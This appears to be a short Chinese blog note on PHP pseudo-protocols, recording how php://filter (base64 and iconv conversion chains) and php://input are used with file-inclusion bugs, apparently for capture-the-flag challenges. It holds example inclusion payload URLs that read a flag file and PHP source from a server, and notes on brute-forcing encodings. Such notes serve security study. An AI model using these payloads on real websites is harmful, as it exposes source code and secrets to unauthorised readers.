---
title: "php伪协议"
modDatetime: 2025-01-20T21:06:41.000+08:00
description: "PHP filter、data、phar 等伪协议用法与利用记录"
tags: ["php"]
---

php伪协议有

1. php://filter
2. php://input

可用于的场景

1. 配合文件包含读取文件内容
2.

## filter协议

[p神](https://www.leavesongs.com/PENETRATION/php-filter-magic.html#_1)
由于包含php文件会直接执行, 而不会显示代码, 因此需要用到filter协议来读取php代码

```
http://ip:port/index.php?filename=

php://filter/read=convert.base64-encode/resource=/flag
```

在某些编码被过滤的时候,更通用的是

```
http://127.0.0.1:32771/index.php?filename=

php://filter//convert.iconv.<input-encoding>.<output-encoding>/resource=/var/www/html/flag.php
```

其中encoding可选的编码方式见php-supported-encodings

必要时可以两个爆破点进行爆破

## input协议

php://input用于文件包含需要开启allow_url_include: On(默认关闭)
如

```php
<?php
include "php://input"
```

通常将报错,fail to open...

可以用于读取内容,需要 allow_url_fopen: On(默认开启)
如

```php
<?php
file_get_contents("php://input")
```
